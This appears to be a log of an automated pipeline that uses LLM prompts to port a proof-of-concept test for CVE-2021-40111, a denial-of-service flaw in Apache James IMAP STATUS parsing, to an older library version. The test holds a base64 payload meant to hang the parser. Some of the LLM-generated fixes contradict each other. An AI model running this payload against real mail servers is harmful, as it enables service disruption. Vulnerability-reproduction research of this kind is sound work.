  found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession
  reason: actual and formal argument lists differ in length
[INFO] 2 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.642 s
[INFO] Finished at: 2025-07-11T11:46:28Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[36,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
[ERROR]   required: no arguments
[ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory
[ERROR]   reason: actual and formal argument lists differ in length
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[40,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
[ERROR]   required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession
[ERROR]   found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession
[ERROR]   reason: actual and formal argument lists differ in length
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>edu.vision.se</groupId>
    <artifactId>CVE-2021-40111</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

    <dependencies>
        
        <dependency>
            <groupId>org.apache.james.protocols</groupId>
            <artifactId>protocols-imap</artifactId>
            <version>3.4.0</version>
        </dependency>
        <dependency>
            <groupId>org.assertj</groupId>
            <artifactId>assertj-core</artifactId>
            <version>3.22.0</version>
        </dependency>
    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
    
    </dependencies>

</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 176 (prompt), 27 (completion), 203 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 3.4.0: 

Error: constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length, None, None 

The test executes as expected in 3.5.0 

Error code:         super(statusResponseFactory); 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.apache.james.imap.decode.parser.StatusCommandParser;org.apache.james.imap.message.response.UnpooledStatusResponseFactory
[96m[ErrorManager] Extracted key entities: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.message.response.UnpooledStatusResponseFactory'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 36, 'column': 9, 'message': 'constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length', 'symbol': None, 'location': None, 'code_line': '        super(statusResponseFactory);'} with cause: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.message.response.UnpooledStatusResponseFactory'][0m
[LLMClient] Tokens used: 220 (prompt), 27 (completion), 247 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 3.4.0: 

Error: constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length, None, None 

The test executes as expected in 3.5.0 

Error code:         super(statusResponseFactory); 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Current cause: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.message.response.UnpooledStatusResponseFactory'] 

 failed to catch, try simpler or other entities.

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.apache.james.imap.decode.parser.StatusCommandParser;org.apache.james.imap.message.response.UnpooledStatusResponseFactory
[96m[ErrorManager] Extracted key entities: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.message.response.UnpooledStatusResponseFactory'][0m
[96m[Adapter] Related diffs for error: [(5746, 6.0), (5756, 5.0), (5761, 5.0), (5785, 5.0), (5812, 5.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length | cause: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.message.response.UnpooledStatusResponseFactory'][0m
[96m[RepairModule] Trying best diff #5746 with score 6.00[0m
[LLMClient] Tokens used: 975 (prompt), 452 (completion), 1427 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully in 3.5.0.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 3.5.0 to 3.4.0.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length, symble: None, location: None

### Error Position:
        super(statusResponseFactory);

### Related Diff:
Operation: MODIFIED, File: protocols/imap/src/test/java/org/apache/james/imap/message/response/UnpooledStatusResponseFactoryTest.java, Hunk: @@ -19,16 +19,24 @@

 package org.apache.james.imap.message.response;

+import org.apache.james.imap.api.message.response.AbstractTestForStatusResponseFactory;
-import org.apache.james.imap.api.ImapCommand;
-import org.apache.james.imap.api.message.response.AbstractStatusResponseFactoryTest;
 import org.apache.james.imap.api.message.response.StatusResponseFactory;
+import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
-import org.junit.jupiter.api.BeforeEach;

+public class UnpooledStatusResponseFactoryTest extends
+        AbstractTestForStatusResponseFactory {
-class UnpooledStatusResponseFactoryTest implements AbstractStatusResponseFactoryTest {
-
-    StatusResponseFactory factory;
-
-
-    @BeforeEach
-    void setUp() throws Exception {
-        factory = new UnpooledStatusResponseFactory();
-    }

     @Override
+    protected StatusResponseFactory createInstance() {
+        return new UnpooledStatusResponseFactory();
-    public StatusResponseFactory factory() {
-        return factory;
     }

 }

### Test File Content:
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.protocols.imap.utils.DecoderUtils;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), "AEA", new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super(statusResponseFactory);
    }

    public void decode(ImapRequestStreamLineReader request, String tag, FakeImapSession session) throws DecodingException {
        super.decode(request, tag, session);
    }
}



[LLMClient] Response: 
Here's the modified version of the test file according to the diff:

```java
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.protocols.imap.utils.DecoderUtils;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild()
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), "AEA", new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild() {
        super();
    }

    public void decode(ImapRequestStreamLineReader request, String tag, FakeImapSession session) throws DecodingException {
        super.decode(request, tag, session);
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[40,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[RepairModule] Old grouped keys: {'constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length |', 'method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length |'}
[RepairModule] New grouped keys: {'method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length |'}
[92m[RepairModule] Error constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length resolved after applying diff.[0m
[92m[RepairModule] Repair success with best diff![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[40,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 1599 (prompt), 1 (completion), 1600 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully with version 3.5.0.

Your task is to:
1. Analyze why this issue occurs with the *3.5.0* but not with the *3.4.0 version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2021-40111 >--------------------
[INFO] Building CVE-2021-40111 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2021-40111 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2021-40111 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2021-40111 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[40,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
  required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession
  found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession
  reason: actual and formal argument lists differ in length
[INFO] 1 error
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.286 s
[INFO] Finished at: 2025-07-11T11:47:09Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[40,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
[ERROR]   required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession
[ERROR]   found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession
[ERROR]   reason: actual and formal argument lists differ in length
[ERROR] 
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>edu.vision.se</groupId>
    <artifactId>CVE-2021-40111</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

    <dependencies>
        
        <dependency>
            <groupId>org.apache.james.protocols</groupId>
            <artifactId>protocols-imap</artifactId>
            <version>3.4.0</version>
        </dependency>
        <dependency>
            <groupId>org.assertj</groupId>
            <artifactId>assertj-core</artifactId>
            <version>3.22.0</version>
        </dependency>
    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
    
    </dependencies>

</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 234 (prompt), 29 (completion), 263 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 3.4.0: 

Error: method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length, None, None 

The test executes as expected in 3.5.0 

Error code:         super.decode(request, tag, session); 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.apache.james.imap.decode.parser.StatusCommandParser;decode
org.apache.james.imap.decode.ImapRequestStreamLineReader
[96m[ErrorManager] Extracted key entities: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'decode\norg.apache.james.imap.decode.ImapRequestStreamLineReader'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 40, 'column': 14, 'message': 'method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length', 'symbol': None, 'location': None, 'code_line': '        super.decode(request, tag, session);'} with cause: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'decode\norg.apache.james.imap.decode.ImapRequestStreamLineReader'][0m
[LLMClient] Tokens used: 280 (prompt), 29 (completion), 309 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 3.4.0: 

Error: method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length, None, None 

The test executes as expected in 3.5.0 

Error code:         super.decode(request, tag, session); 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Current cause: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'decode\norg.apache.james.imap.decode.ImapRequestStreamLineReader'] 

 failed to catch, try simpler or other entities.

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.apache.james.imap.decode.parser.StatusCommandParser;decode;org.apache.james.imap.decode.ImapRequestStreamLineReader
[96m[ErrorManager] Extracted key entities: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'decode', 'org.apache.james.imap.decode.ImapRequestStreamLineReader'][0m
[96m[Adapter] Related diffs for error: [(4986, 10.0), (5554, 10.0), (5555, 10.0), (5556, 10.0), (5557, 10.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length | cause: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'decode', 'org.apache.james.imap.decode.ImapRequestStreamLineReader'][0m
[96m[RepairModule] Trying best diff #4986 with score 10.00[0m
[LLMClient] Tokens used: 893 (prompt), 497 (completion), 1390 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully in 3.5.0.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 3.5.0 to 3.4.0.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length, symble: None, location: None

### Error Position:
        super.decode(request, tag, session);

### Related Diff:
Operation: MODIFIED, File: protocols/imap/src/main/java/org/apache/james/imap/decode/main/ImapRequestStreamHandler.java, Hunk: @@ -26,6 +26,7 @@
 import org.apache.james.imap.api.ImapSessionState;
 import org.apache.james.imap.api.process.ImapProcessor;
 import org.apache.james.imap.api.process.ImapSession;
-import org.apache.james.imap.decode.DecodingException;
 import org.apache.james.imap.decode.ImapDecoder;
 import org.apache.james.imap.decode.ImapRequestLineReader;
 import org.apache.james.imap.decode.ImapRequestStreamLineReader;

### Test File Content:
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.protocols.imap.utils.DecoderUtils;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild()
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), "AEA", new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild() {
        super();
    }

    public void decode(ImapRequestStreamLineReader request, String tag, FakeImapSession session) throws DecodingException {
        super.decode(request, tag, session);
    }
}



[LLMClient] Response: 
Here's the modified version of the test file according to the diff:

```java
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.protocols.imap.utils.DecoderUtils;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;
import org.apache.james.imap.api.ImapCommand;
import org.apache.james.imap.api.process.ImapSession;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild()
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), "AEA", new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild() {
        super(new UnpooledStatusResponseFactory());
    }

    public void decode(ImapRequestStreamLineReader request, String tag, FakeImapSession session) throws DecodingException {
        super.decode(ImapCommand.anyStateCommand("Status"), request, tag, session);
    }
}
```
